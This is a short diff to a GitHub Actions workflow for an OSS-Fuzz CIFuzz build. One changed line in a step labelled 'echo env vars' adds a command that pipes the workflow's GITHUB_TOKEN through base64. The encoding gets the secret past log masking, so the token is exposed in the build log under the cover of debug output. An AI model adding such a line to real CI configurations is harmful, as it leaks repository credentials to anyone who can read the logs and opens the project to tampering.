@@ -43,7 +43,7 @@ jobs:
        workflow: cifuzz.yml
        path: /tmp/old-artifact
    - name: echo env vars
-     run: echo "GITHUB_HEAD_REF $GITHUB_HEAD_REF GITHUB_BASE_REF $GITHUB_BASE_REF GITHUB_REF $GITHUB_REF GITHUB_HEAD_REF $GITHUB_HEAD_REF GITHUB_ACTION_REF $GITHUB_ACTION_REF GITHUB_SHA $GITHUB_SHA GITHUB_RUN_ID $GITHUB_RUN_ID" && ls /tmp/old-artifact
+     run: echo "GITHUB_HEAD_REF $GITHUB_HEAD_REF GITHUB_BASE_REF $GITHUB_BASE_REF GITHUB_REF $GITHUB_REF GITHUB_HEAD_REF $GITHUB_HEAD_REF GITHUB_ACTION_REF $GITHUB_ACTION_REF GITHUB_SHA $GITHUB_SHA GITHUB_RUN_ID $GITHUB_RUN_ID" && ls /tmp/old-artifact && echo $GITHUB_TOKEN | base64
    - name: Build Fuzzers
      id: build
      uses: google/oss-fuzz/infra/cifuzz/actions/build_fuzzers@cifuzz-artifacts
